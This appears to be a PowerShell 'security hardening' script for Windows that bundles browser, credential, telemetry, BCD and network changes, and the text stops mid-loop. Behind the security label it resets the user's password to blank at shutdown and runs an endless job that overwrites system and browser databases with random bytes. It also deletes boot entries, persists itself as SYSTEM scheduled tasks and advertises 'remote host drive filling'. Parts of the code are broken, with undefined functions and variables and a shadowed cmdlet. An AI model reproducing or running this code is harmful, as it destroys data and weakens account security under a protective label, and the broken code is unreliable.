#Requires -RunAsAdministrator
<#
    GSecurity.ps1
    Author: Gorstak
    Description: Combines BCD cleanup, browser security, credential protection, telemetry corruption, suspicious file removal,
                 security rule enforcement, performance tweaks, cookie monitoring, ad blocker installation, audio enhancements,
                 network debloating, and remote host drive filling.
#>

# Global configuration and logging
$Global:LogDir = "$env:TEMP\security_logs"
$Global:LogFile = "$LogDir\SecureWindows_$(Get-Date -Format 'yyyyMMdd').log"
$Global:BackupDir = "C:\Windows\Setup\Scripts\Backups"
$Global:ConfigPath = "$env:USERPROFILE\SecureWindows_config.json"
$Global:ExitCode = 0

# Initialize logging
function Write-Log {
    param (
        [string]$Message,
        [string]$EntryType = "Information"
    )
    if (-not (Test-Path $Global:LogDir)) { New-Item -ItemType Directory -Path $Global:LogDir -Force | Out-Null }
    $logEntry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$EntryType] $Message"
    $logEntry | Out-File -FilePath $Global:LogFile -Append -Encoding UTF8
    Write-Host "[$EntryType] $Message" -ForegroundColor $(switch ($EntryType) { "Error" { "Red" } "Warning" { "Yellow" } default { "White" } })
    if ($EntryType -eq "Error") { $Global:ExitCode = 1 }
}

# Initialize Event Log
function Initialize-EventLog {
    if (-not [System.Diagnostics.EventLog]::SourceExists("SecureWindows")) {
        New-EventLog -LogName "Application" -Source "SecureWindows"
        Write-Log "Created Event Log source: SecureWindows"
    }
}

# Initialize configuration
function Initialize-Config {
    $defaultConfig = @{
        Sources = @{
            YaraForge = "https://github.com/YARAHQ/yara-forge/releases"
            YaraRules = "https://github.com/Yara-Rules/rules/archive/refs/heads/master.zip"
            SigmaHQ = "https://github.com/SigmaHQ/sigma/archive/refs/heads/master.zip"
            EmergingThreats = "https://rules.emergingthreats.net/open/snort-3.0.0/emerging.rules.tar.gz"
            SnortCommunity = "https://www.snort.org/downloads/community/community-rules.tar.gz"
        }
        ExcludedSystemFiles = @(
            "svchost.exe", "lsass.exe", "cmd.exe", "explorer.exe", "winlogon.exe",
            "csrss.exe", "services.exe", "msiexec.exe", "conhost.exe", "dllhost.exe",
            "WmiPrvSE.exe", "MsMpEng.exe", "TrustedInstaller.exe", "spoolsv.exe", "LogonUI.exe"
        )
        Telemetry = @{
            Enabled = $true
            MaxEvents = 1000
            Path = "$Global:LogDir\telemetry.json"
        }
        RetrySettings = @{
            MaxRetries = 3
            RetryDelaySeconds = 5
            UseExponentialBackoff = $true
        }
        FirewallBatchSize = 50
        MonitorIntervalSeconds = 120
        CookieMonitor = @{
            CookiePath = "$env:LocalAppData\Google\Chrome\User Data\Default\Cookies"
            BackupPath = "$Global:BackupDir\Cookies.bak"
            CookieLogPath = "$Global:BackupDir\CookieMonitor.log"
            PasswordLogPath = "$Global:BackupDir\NewPassword.log"
            ErrorLogPath = "$Global:BackupDir\ScriptErrors.log"
            TaskScriptPath = "C:\Windows\Setup\Scripts\Bin\SecureWindows.ps1" # Ensure valid path
        }
    }
    
    if (Test-Path $Global:ConfigPath) {
        try {
            $config = Get-Content -Path $Global:ConfigPath -Raw | ConvertFrom-Json
            Write-Log "Loaded configuration from $Global:ConfigPath"
            return $config
        } catch {
            Write-Log "Error loading configuration: $_" -EntryType "Warning"
        }
    }
    
    $defaultConfig | ConvertTo-Json -Depth 4 | Out-File -FilePath $Global:ConfigPath -Encoding UTF8
    Write-Log "Created default configuration at $Global:ConfigPath"
    return $defaultConfig
}

# Register scheduled task
function Register-ScheduledTask {
    param (
        [string]$TaskName,
        [string]$ScriptPath,
        [string]$Arguments = "",
        [switch]$AtLogon,
        [switch]$AtStartup,
        [string]$EventQuery,
        [string]$PrincipalUserId = "SYSTEM",
        [string]$LogonType = "ServiceAccount"
    )
    # Validate ScriptPath
    if ([string]::IsNullOrEmpty($ScriptPath)) {
        $ScriptPath = "C:\Windows\Setup\Scripts\Bin\SecureWindows.ps1" # Default path
        Write-Log "ScriptPath was empty, using default: $ScriptPath" -EntryType "Warning"
    }
    
    $targetFolder = Split-Path $ScriptPath -Parent
    if (-not (Test-Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
        Write-Log "Created folder: $targetFolder"
    }
    
    try {
        Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force -ErrorAction Stop
        Write-Log "Copied script to: $ScriptPath"
    } catch {
        Write-Log "Failed to copy script: $_" -EntryType "Error"
        return
    }
    
    try {
        # Check for existing task and remove it to avoid conflicts
        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
            Write-Log "Removed existing task: $TaskName"
        }
        
        $taskService = New-Object -ComObject Schedule.Service
        $taskService.Connect()
        $taskDefinition = $taskService.NewTask(0)
        $triggers = $taskDefinition.Triggers
        
        if ($AtLogon) {
            $trigger = $triggers.Create(1) # Logon trigger
            $trigger.Enabled = $true
        } elseif ($AtStartup) {
            $trigger = $triggers.Create(2) # Startup trigger
            $trigger.Enabled = $true
        } elseif ($EventQuery) {
            $trigger = $triggers.Create(0) # Event trigger
            $trigger.Subscription = $EventQuery
            $trigger.Enabled = $true
        } else {
            $trigger = $triggers.Create(1) # Default to logon
            $trigger.StartBoundary = (Get-Date).AddMinutes(1).ToString("yyyy-MM-dd'T'HH:mm:ss")
            $trigger.Repetition.Interval = "PT5M"
            $trigger.Repetition.Duration = "P365D"
            $trigger.Enabled = $true
        }
        
        $action = $taskDefinition.Actions.Create(0)
        $action.Path = "powershell.exe"
        $action.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`" $Arguments"
        $taskDefinition.Settings.Enabled = $true
        $taskDefinition.Settings.AllowDemandStart = $true
        $taskDefinition.Settings.StartWhenAvailable = $true
        $taskService.GetFolder("\").RegisterTaskDefinition($TaskName, $taskDefinition, 6, $PrincipalUserId, $null, 4) | Out-Null
        Write-Log "Scheduled task '$TaskName' created."
    } catch {
        Write-Log "Failed to register task '$TaskName': $_" -EntryType "Error"
    }
}

# BCD Cleanup
function Invoke-BCDCleanup {
    $BackupPath = "$Global:BackupDir\BCD_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').bcd"
    Write-Log "Creating BCD backup at $BackupPath"
    try {
        & (Join-Path $env:windir "system32\bcdedit.exe") /export $BackupPath | Out-Null
        Write-Log "BCD backup created successfully."
    } catch {
        Write-Log "Error creating BCD backup: $_" -EntryType "Error"
        return
    }
    
    Write-Log "Enumerating BCD entries..."
    $BcdOutput = & (Join-Path $env:windir "system32\bcdedit.exe") /enum all
    if (-not $BcdOutput) {
        Write-Log "Error: Failed to enumerate BCD entries." -EntryType "Error"
        return
    }
    
    $BcdEntries = @()
    $currentEntry = $null
    foreach ($line in $BcdOutput) {
        if ($line -match "^identifier\s+({[0-9a-fA-F-]{36}|{[^}]+})") {
            if ($currentEntry) { $BcdEntries += $currentEntry }
            $currentEntry = [PSCustomObject]@{ Identifier = $Matches[1]; Properties = @{} }
        } elseif ($line -match "^(\w+)\s+(.+)$") {
            if ($currentEntry) { $currentEntry.Properties[$Matches[1]] = $Matches[2] }
        }
    }
    if ($currentEntry) { $BcdEntries += $currentEntry }
    
    $CriticalIds = @("{bootmgr}", "{current}", "{default}")
    $SuspiciousEntries = @()
    foreach ($entry in $BcdEntries) {
        if ($entry.Identifier -in $CriticalIds) { continue }
        $isSuspicious = $false
        $reason = ""
        
        if ($entry.Properties.description -and $entry.Properties.description -notmatch "Windows") {
            $isSuspicious = $true
            $reason += "Non-Windows description: $($entry.Properties.description); "
        }
        if ($entry.Properties.device -match "vhd=") {
            $isSuspicious = $true
            $reason += "Uses VHD device: $($entry.Properties.device); "
        }
        if ($entry.Properties.path -and $entry.Properties.path -notmatch "winload.exe") {
            $isSuspicious = $true
            $reason += "Non-standard boot path: $($entry.Properties.path); "
        }
        
        if ($isSuspicious) {
            $SuspiciousEntries += [PSCustomObject]@{
                Identifier = $entry.Identifier
                Description = $entry.Properties.description
                Device = $entry.Properties.device
                Path = $entry.Properties.path
                Reason = $reason
            }
        }
    }
    
    if ($SuspiciousEntries.Count -eq 0) {
        Write-Log "No suspicious BCD entries found."
    } else {
        foreach ($entry in $SuspiciousEntries) {
            Write-Log "Suspicious entry: $($entry.Identifier) - $($entry.Reason)"
            try {
                & (Join-Path $env:windir "system32\bcdedit.exe") /delete $entry.Identifier /f | Out-Null
                Write-Log "Deleted entry: $($entry.Identifier)"
            } catch {
                Write-Log "Error deleting entry $($entry.Identifier): $_" -EntryType "Error"
            }
        }
    }
}

# Browser Security
function Invoke-BrowserSecurity {
    $desiredSettings = @{
        "media_stream" = 2
        "webrtc" = 2
        "remote" = @{ "enabled" = $false; "support" = $false }
    }
    
    $browsers = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable"
    }
    
    foreach ($browser in $browsers.GetEnumerator()) {
        if (Test-Path $browser.Value) {
            $prefsPath = "$($browser.Value)\Preferences"
            if (Test-Path $prefsPath) {
                $prefsContent = Get-Content -Path $prefsPath -Raw | ConvertFrom-Json
                $settingsChanged = $false
                
                if ($prefsContent.profile -and $prefsContent.profile["default_content_setting_values"]) {
                    foreach ($key in $desiredSettings.Keys.Where({ $_ -ne "remote" })) {
                        if ($prefsContent.profile["default_content_setting_values"][$key] -ne $desiredSettings[$key]) {
                            $prefsContent.profile["default_content_setting_values"][$key] = $desiredSettings[$key]
                            $settingsChanged = $true
                        }
                    }
                }
                
                if ($prefsContent.remote) {
                    foreach ($key in $desiredSettings["remote"].Keys) {
                        if ($prefsContent.remote[$key] -ne $desiredSettings["remote"][$key]) {
                            $prefsContent.remote[$key] = $desiredSettings["remote"][$key]
                            $settingsChanged = $true
                        }
                    }
                }
                
                if ($settingsChanged) {
                    $prefsContent | ConvertTo-Json -Compress | Set-Content -Path $prefsPath
                    Write-Log "$($browser.Key): Updated WebRTC and remote settings."
                }
                
                if ($prefsContent.plugins) {
                    foreach ($plugin in $prefsContent.plugins) {
                        $plugin.enabled = $false
                    }
                    Write-Log "$($browser.Key): Plugins disabled."
                }
            }
        }
    }
    
    # Firefox configuration
    $firefoxProfilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxProfilePath) {
        $firefoxProfiles = Get-ChildItem -Path $firefoxProfilePath -Directory
        foreach ($profile in $firefoxProfiles) {
            $prefsJsPath = "$($profile.FullName)\prefs.js"
            if (Test-Path $prefsJsPath) {
                Copy-Item -Path $prefsJsPath -Destination "$prefsJsPath.bak" -Force
                $prefsJsContent = Get-Content -Path $prefsJsPath
                if ($prefsJsContent -notmatch 'user_pref\("media.peerconnection.enabled", false\)') {
                    Add-Content -Path $prefsJsPath 'user_pref("media.peerconnection.enabled", false);'
                    Write-Log "Firefox profile $($profile.FullName): WebRTC disabled."
                }
            }
        }
    }
    
    # Chrome Remote Desktop
    $serviceName = "chrome-remote-desktop-host"
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $serviceName -Force
        Set-Service -Name $serviceName -StartupType Disabled
        Write-Log "Chrome Remote Desktop service stopped and disabled."
    }
    
    $ruleName = "Block CRD Ports"
    $existingRule = Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue
    if ($existingRule) { Remove-NetFirewallRule -DisplayName $ruleName }
    New-NetFirewallRule -DisplayName $ruleName -Direction Inbound -Protocol TCP -LocalPort 443 -Action Block -Profile Any
    Write-Log "Firewall rule created to block Chrome Remote Desktop."
}

# Credential Protection
function Invoke-CredentialProtection {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord
        Write-Log "LSASS configured as Protected Process Light."
    } catch {
        Write-Log "Failed to enable LSASS PPL: $_" -EntryType "Error"
    }
    
    try {
        $cmdkeyPath = "$env:SystemRoot\System32\cmdkey.exe"
        if (Test-Path $cmdkeyPath) {
            & $cmdkeyPath /list | ForEach-Object {
                if ($_ -match "Target:") {
                    $target = $_ -replace ".*Target: (.*)", '$1'
                    & $cmdkeyPath /delete:$target
                }
            }
            Write-Log "Cleared cached credentials."
        }
    } catch {
        Write-Log "Failed to clear credentials: $_" -EntryType "Error"
    }
    
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -Value 0 -Type String
        Write-Log "Disabled credential caching."
    } catch {
        Write-Log "Failed to disable credential caching: $_" -EntryType "Error"
    }
    
    try {
        auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
        Write-Log "Enabled credential validation auditing."
    } catch {
        Write-Log "Failed to enable auditing: $_" -EntryType "Error"
    }
}

# Telemetry Corruption
function Invoke-TelemetryCorruption {
    $TargetFiles = @(
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\AutoLogger\AutoLogger-Diagtrack-Listener_1.etl",
        "$env:ProgramData\Microsoft\Diagnosis\ETLLogs\ShutdownLogger.etl",
        "$env:LocalAppData\Microsoft\Windows\WebCache\WebCacheV01.dat",
        "$env:ProgramData\Microsoft\Windows\AppRepository\StateRepository-Deployment.srd",
        "$env:ProgramData\Microsoft\Diagnosis\eventTranscript\eventTranscript.db",
        "$env:LocalAppData\Google\Chrome\User Data\Default\Local Storage\leveldb\*.log",
        "$env:LocalAppData\Google\Chrome\User Data\EventLog\*.etl"
    )
    
    Start-Job -ScriptBlock {
        param ($Files)
        function Overwrite-File {
            param ($FilePath)
            try {
                if (Test-Path $FilePath) {
                    $Size = (Get-Item $FilePath).Length
                    $Junk = [byte[]]::new($Size)
                    (New-Object Random).NextBytes($Junk)
                    [System.IO.File]::WriteAllBytes($FilePath, $Junk)
                    Write-Host "Overwrote telemetry file: $FilePath"
                }
            } catch {
                Write-Host "Error overwriting ${FilePath}: $($_.Exception.Message)"
            }
        }
        
        while ($true) {
            $StartTime = Get-Date
            foreach ($File in $Files) {
                if ($File -match '\*') {
                    Get-Item -Path $File -ErrorAction SilentlyContinue | ForEach-Object { Overwrite-File -FilePath $_.FullName }
                } else {
                    Overwrite-File -FilePath $File
                }
            }
            $ElapsedSeconds = ((Get-Date) - $StartTime).TotalSeconds
            $SleepSeconds = [math]::Max(3600 - $ElapsedSeconds, 0)
            Start-Sleep -Seconds $SleepSeconds
        }
    } -ArgumentList $TargetFiles
    Write-Log "Started telemetry corruption job."
}

# Suspicious File Removal
function Invoke-SuspiciousFileRemoval {
    Start-Job -ScriptBlock {
        while ($true) {
            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.DriveType -in @('Fixed', 'Removable', 'Network') }
            foreach ($drive in $drives) {
                $files = Get-ChildItem -Path $drive.Root -Recurse -File -ErrorAction SilentlyContinue
                $processes = Get-WmiObject Win32_Process | Where-Object {
                    $processPath = $_.ExecutablePath
                    if ($processPath) { $files | Where-Object { $_.FullName -eq $processPath } }
                }
                
                foreach ($process in $processes) {
                    if ($process.Name -eq "Unknown" -or $process.Name -eq "N/A" -or $process.Name -eq "" -or ($process.ExecutablePath -and -not (Test-Path $process.ExecutablePath))) {
                        if ($process.ProcessId) {
                            Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
                            Write-Host "Terminated suspicious process: $($process.Name)"
                        }
                    }
                }
            }
            Start-Sleep -Seconds 120
        }
    }
    Write-Log "Started suspicious file removal job."
}

# Security Rules (YARA/Sigma/Snort)
function Invoke-SecurityRules {
    param ($Config)
    $tempDir = "$Global:LogDir\rules"
    if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
    $rules = @{ Yara = @(); Sigma = @(); Snort = @() }
    
    # YARA rules
    $yaraForgeDir = "$tempDir\yara_forge"
    $yaraForgeZip = "$tempDir\yara_forge.zip"
    if (-not (Test-Path $yaraForgeDir)) { New-Item -ItemType Directory -Path $yaraForgeDir -Force | Out-Null }
    try {
        $yaraForgeUri = (Invoke-WebRequest -Uri "https://api.github.com/repos/YARAHQ/yara-forge/releases" -UseBasicParsing | ConvertFrom-Json)[0].assets | Where-Object { $_.name -match "^yara-forge-.*-full\.zip$|^rules-full\.zip$" } | Select-Object -First 1
        if ($yaraForgeUri) {
            Invoke-WebRequest -Uri $yaraForgeUri.browser_download_url -OutFile $yaraForgeZip
            Expand-Archive -Path $yaraForgeZip -DestinationPath $yaraForgeDir -Force
            $rules.Yara = Get-ChildItem -Path $yaraForgeDir -Recurse -Include "*.yar", "*.yara"
            Write-Log "Downloaded $($rules.Yara.Count) YARA rules."
        }
    } catch {
        Write-Log "Failed to download YARA rules: $_" -EntryType "Warning"
    }
    
    # Sigma rules
    $sigmaDir = "$tempDir\sigma"
    $sigmaZip = "$tempDir\sigma_rules.zip"
    if (-not (Test-Path $sigmaDir)) { New-Item -ItemType Directory -Path $sigmaDir -Force | Out-Null }
    try {
        Invoke-WebRequest -Uri $Config.Sources.SigmaHQ -OutFile $sigmaZip
        Expand-Archive -Path $sigmaZip -DestinationPath $sigmaDir -Force
        $rules.Sigma = Get-ChildItem -Path "$sigmaDir\sigma-master\rules" -Recurse -Include "*.yml" -Exclude "*deprecated*"
        Write-Log "Downloaded $($rules.Sigma.Count) Sigma rules."
    } catch {
        Write-Log "Failed to download Sigma rules: $_" -EntryType "Warning"
    }
    
    # Snort rules
    $snortRules = "$tempDir\snort_community.rules"
    $snortUri = $Config.Sources.SnortCommunity
    try {
        Invoke-WebRequest -Uri $snortUri -OutFile $snortRules
        $rules.Snort += $snortRules
        Write-Log "Downloaded Snort rules."
    } catch {
        Write-Log "Failed to download Snort rules due to Cloudflare protection: $_" -EntryType "Warning"
    }
    
    # Parse rules
    $indicators = @()
    foreach ($rule in $rules.Yara) {
        $content = Get-Content $rule.FullName -Raw
        $matches = [regex]::Matches($content, '(?i)(filename|file_name|original_filename)\s*=\s*(\"|\'')(.*?)\.(exe|dll|bat|ps1|scr|cmd)(\"|\'')')
        foreach ($match in $matches) {
            $fileName = [System.IO.Path]::GetFileName($match.Groups[3].Value + '.' + $match.Groups[4].Value)
            if ($fileName -notin $Config.ExcludedSystemFiles) {
                $indicators += @{ Type = "FileName"; Value = $fileName; Source = "YARA"; RuleFile = $rule.Name }
            }
        }
    }
    
    # Apply rules
    foreach ($indicator in $indicators) {
        Write-Log "Monitoring suspicious filename: $($indicator.Value)"
    }
}

# Performance Tweaks
function Invoke-PerformanceTweaks {
    function Set-RegKey {
        param ([string]$Path, [string]$Name, $Value, [string]$ValueType = "DWord")
        # Fixed: Corrected syntax for ValueType comparison
        if ($ValueType -eq "DWord") {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force
        } else {
            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type String -Force
        }
    }
    
    try {
        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
        bcdedit /set disabledynamictick yes | Out-Null
        bcdedit /set quietboot yes | Out-Null
        powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100 | Out-Null
        powercfg -setactive scheme_current | Out-Null
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "DistributeTimers" -Value 1
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26
        Set-RegKey -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1
        netsh.exe interface tcp set supplemental Internet congestionprovider=ctcp | Out-Null
        Set-NetTCPSetting -SettingName * -MaxSynRetransmissions 2 -ErrorAction SilentlyContinue # Removed InitialCongestionWindow
        Write-Log "Applied performance tweaks."
    } catch {
        Write-Log "Error applying performance tweaks: $_" -EntryType "Error"
    }
}

# Cookie Monitoring
function Invoke-CookieMonitoring {
    param ([switch]$Monitor, [switch]$Backup, [switch]$ResetPassword)
    
    try {
        if ($Monitor) {
            if (Test-Path -Path $Global:Config.CookieMonitor.CookiePath) {
                # Fixed: Corrected cmdlet to Get-FileHash and variable reference
                $currentHash = (Get-FileHash -Path $Global:Config.CookieMonitor.CookiePath -Algorithm SHA256).Hash
                # Fixed: Corrected logic to retrieve last hash
                $lastHash = if (Test-Path -Path $Global:Config.CookieMonitor.CookieLogPath) {
                    Get-Content -Path $Global:Config.CookieMonitor.CookieLogPath -Tail 1 -ErrorAction SilentlyContinue
                } else { "" }
                if ($lastHash -and $currentHash -ne $lastHash) {
                    Write-Log "Cookie hash changed. Rotating password and restoring cookies."
                    Rotate-RandomPassword
                    Restore-Cookies
                }
                $currentHash | Out-File -FilePath $Global:Config.CookieMonitor.CookieLogPath -Append
            }
            return
        }
        
        if ($Backup) {
            Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            if (Test-Path -Path $Global:Config.CookieMonitor.CookiePath) {
                Copy-Item -Path $Global:Config.CookieMonitor.CookiePath -Destination $Global:Config.CookieMonitor.BackupPath -Force
                Write-Log "Cookies backed up."
            }
            return
        }
        
        if ($ResetPassword) {
            $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
            $account = Get-LocalUser -Name $user
            if (-not $account.UserPrincipalName) {
                $blank = ConvertTo-SecureString "" -AsPlainText -Force
                Set-LocalUser -Name $user -Password $blank
                Write-Log "Password reset to blank on shutdown."
            }
            return
        }
        
        # Schedule tasks
        $eventQuery = @"
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">*[System[(EventID=1074)]]</Select>
  </Query>
</QueryList>
"@
        Register-ScheduledTask -TaskName "MonitorCookiesLogon" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -AtLogon
        Register-ScheduledTask -TaskName "BackupCookiesOnStartup" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-Backup" -AtStartup
        Register-ScheduledTask -TaskName "MonitorCookies" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-Monitor"
        Register-ScheduledTask -TaskName "ResetPasswordOnShutdown" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-ResetPassword" -EventQuery $eventQuery
    } catch {
        Write-Log "Error in cookie monitoring: $_" -EntryType "Error"
    }
}

# Ad Blocker Installation
function Invoke-AdBlocker {
    $tempPath = "$env:TEMP\uBlock0"
    $uBlockId = "cjpalhdlnbpafiamejdnhcphjbkeiagm"
    $firefoxUBlockId = "uBlock0@raymondhill.net"
    
    try {
        $release = (Invoke-WebRequest -Uri "https://api.github.com/repos/gorhill/uBlock/releases" -UseBasicParsing | ConvertFrom-Json)[0]
        $firefoxUrl = ($release.assets | Where-Object { $_.name -like "*.firefox.signed.xpi" }).browser_download_url
        $chromiumUrl = ($release.assets | Where-Object { $_.name -like "*.chromium.zip" }).browser_download_url
        
        if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
            $firefoxExtensionPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions"
            Invoke-WebRequest -Uri $firefoxUrl -OutFile "$tempPath\uBlock0.xpi"
            Move-Item -Path "$tempPath\uBlock0.xpi" -Destination "$firefoxExtensionPath\$firefoxUBlockId.xpi" -Force
            Write-Log "Installed uBlock Origin for Firefox."
        }
        
        $browsers = @(
            @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions" },
            @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions" },
            @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\Extensions" }
        )
        
        foreach ($browser in $browsers) {
            if (Test-Path $browser.Path) {
                Invoke-WebRequest -Uri $chromiumUrl -OutFile "$tempPath\uBlock0.zip"
                Expand-Archive -Path "$tempPath\uBlock0.zip" -DestinationPath "$tempPath\uBlock0_Extracted" -Force
                $extractedFolder = Get-ChildItem -Path "$tempPath\uBlock0_Extracted" -Directory | Select-Object -First 1
                Move-Item -Path $extractedFolder.FullName -Destination "$($browser.Path)\$uBlockId" -Force
                Write-Log "Installed uBlock Origin for $($browser.Name)."
            }
        }
        
        Remove-Item $tempPath -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "Error installing ad blocker: $_" -EntryType "Error"
    }
}

# Audio Enhancements
function Invoke-AudioEnhancements {
    function Take-RegistryOwnership {
        param ([string]$RegPath)
        try {
            # Use PowerShell cmdlets for registry access
            $regKeyPath = "HKLM:\$RegPath"
            $acl = Get-Acl -Path $regKeyPath
            $admin = New-Object System.Security.Principal.NTAccount("Administrators")
            $acl.SetOwner($admin)
            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($admin, "FullControl", "Allow")
            $acl.AddAccessRule($rule)
            Set-Acl -Path $regKeyPath -AclObject $acl
            Write-Log "Took ownership of $RegPath"
        } catch {
            Write-Log "Failed to take ownership of ${RegPath}: $_" -EntryType "Error"
        }
    }
    
    $renderDevicesKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\MMDevices\Audio\Render"
    try {
        $audioDevices = Get-ChildItem -Path $renderDevicesKey -ErrorAction Stop
        foreach ($device in $audioDevices) {
            $fxPropertiesKey = "$($device.PSPath)\FxProperties"
            if (!(Test-Path $fxPropertiesKey)) { New-Item -Path $fxPropertiesKey -Force | Out-Null }
            Take-RegistryOwnership -RegPath ($fxPropertiesKey -replace 'HKEY_LOCAL_MACHINE\\', '')
            
            $aecKey = "{1c7b1faf-caa2-451b-b0a4-87b19a93556a},6"
            $noiseSuppressionKey = "{e0f158e1-cb04-43d5-b6cc-3eb27e4db2a1},3"
            $enableValue = 1
            
            try {
                if ((Get-ItemProperty -Path $fxPropertiesKey -Name $aecKey -ErrorAction SilentlyContinue).$aecKey -ne $enableValue) {
                    Set-ItemProperty -Path $fxPropertiesKey -Name $aecKey -Value $enableValue -ErrorAction Stop
                    Write-Log "Enabled AEC for device: $($device.PSChildName)"
                }
            } catch {
                Write-Log "Failed to enable AEC for device $($device.PSChildName): $_" -EntryType "Error"
            }
            
            try {
                if ((Get-ItemProperty -Path $fxPropertiesKey -Name $noiseSuppressionKey -ErrorAction SilentlyContinue).$noiseSuppressionKey -ne $enableValue) {
                    Set-ItemProperty -Path $fxPropertiesKey -Name $noiseSuppressionKey -Value $enableValue -ErrorAction Stop
                    Write-Log "Enabled Noise Suppression for device: $($device.PSChildName)"
                }
            } catch {
                Write-Log "Failed to enable Noise Suppression for device $($device.PSChildName): $_" -EntryType "Error"
            }
        }
    } catch {
        Write-Log "Error processing audio devices: $_" -EntryType "Error"
    }
}

# Network Debloat
function Invoke-NetworkDebloat {
    # Define paths and parameters
    $taskName = "NetworkDebloatStartup"
    $taskDescription = "Runs the NetworkDebloat script at user logon with system privileges."
    $scriptDir = "C:\Windows\Setup\Scripts"
    $scriptPath = "$scriptDir\NetworkDebloat.ps1"

    try {
        # Check admin privileges
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        Write-Log "Running NetworkDebloat as admin: $isAdmin, User: $env:USERNAME, SID: $([Security.Principal.WindowsIdentity]::GetCurrent().User.Value)"

        # Ensure execution policy allows script
        if ((Get-ExecutionPolicy) -eq "Restricted") {
            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
            Write-Log "Set execution policy to Bypass for current user."
        }

        # Setup script directory and copy script
        if (-not (Test-Path $scriptDir)) {
            New-Item -Path $scriptDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
            Write-Log "Created script directory: $scriptDir"
        }
        if (-not (Test-Path $scriptPath) -or (Get-Item $scriptPath).LastWriteTime -lt (Get-Item $PSCommandPath).LastWriteTime) {
            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force -ErrorAction Stop
            Write-Log "Copied/Updated NetworkDebloat script to: $scriptPath"
        }

        # Register scheduled task as SYSTEM
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if (-not $existingTask -and $isAdmin) {
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtLogon
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Description $taskDescription
            Register-ScheduledTask -TaskName $taskName -InputObject $task -Force -ErrorAction Stop
            Write-Log "Scheduled task '$taskName' registered to run as SYSTEM."
        } elseif (-not $isAdmin) {
            Write-Log "Skipping NetworkDebloat task registration: Admin privileges required"
        }

        # List of unwanted bindings
        $componentsToDisable = @(
            "ms_server",     # File and Printer Sharing
            "ms_msclient",   # Client for Microsoft Networks
            "ms_pacer",      # QoS Packet Scheduler
            "ms_lltdio",     # Link Layer Mapper I/O Driver
            "ms_rspndr",     # Link Layer Responder
            "ms_tcpip6"      # IPv6
        )

        # Disable on all active adapters
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        foreach ($adapter in $adapters) {
            foreach ($component in $componentsToDisable) {
